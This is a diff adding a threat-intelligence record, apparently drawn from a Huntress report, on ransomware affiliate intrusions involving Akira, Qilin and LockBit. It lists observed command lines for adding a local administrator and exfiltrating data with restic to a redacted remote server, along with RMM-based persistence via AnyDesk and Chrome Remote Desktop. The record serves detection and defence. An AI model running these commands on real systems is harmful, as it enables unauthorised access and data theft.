@@ -1,0 +1,60 @@
+title: 'RaaS Tradecraft Tuesday: Ransomware Affiliate Intrusion Techniques and Tools'
+description: Huntress analysts detail how ransomware-as-a-service affiliates conduct
+  intrusions using diverse initial access methods, persistence via RMMs, and data
+  exfiltration tools including 7-Zip, RClone, MegaSync, and finger.exe across multiple
+  real incidents.
+attribution: ''
+malware_families:
+- Akira
+- Qilin
+- LockBit
+cves: []
+ttps:
+  processes:
+  - services.exe
+  - bomgar-scc.exe
+  - cmd.exe
+  - net.exe
+  - remoting_host.exe
+  - AnyDesk.exe
+  - 7z.exe
+  - restic.exe
+  - finger.exe
+  command_lines:
+  - net.exe localgroup administrators User A
+  - C:\Users\user\Downloads\7-ZipPortable\App\7-zip64\7z.exe" a -i#7zMap19592:2148:7zEvent5339
+    -ad -saa --
+  - restic.exe -r rest:http://[REDACTED]:8000/G --password-file ppp.txt --use-fs-snapshot
+    --verbose
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections: []
+  file_activity:
+  - C:\Windows\system32\net.exe
+  - C:\Program Files (x86)\AnyDesk\AnyDesk.exe
+  persistence:
+  - Autorun via Common Startup Folder - anydesk.lnk pointing to C:\Program Files (x86)\AnyDesk\AnyDesk.exe
+    --control
+  - Service (Own Process) - Chrome Remote Desktop Service via C:\Program Files (x86)\Google\Chrome
+    Remote Desktop\147.0.7727.3\remoting_host.exe --type=daemon
+  - Service (Own Process) - AnyDesk Service via C:\Program Files (x86)\AnyDesk\AnyDesk.exe
+    --service
+  - New local user accounts added to administrators group
+  - RMM tools installed post-compromise (AnyDesk, Chrome Remote Desktop)
+  process_relations:
+  - services.exe -> bomgar-scc.exe
+  - bomgar-scc.exe -> cmd.exe
+  - cmd.exe -> net.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors:
+- Harlan Carvey
+- Lindsey ODonnell-Welch
+reference: https://www.huntress.com/blog/raas-ecosystem-ransomware-tradecraft
+date_of_publication: May 22, 2026
+file_creation_date: May 22, 2026
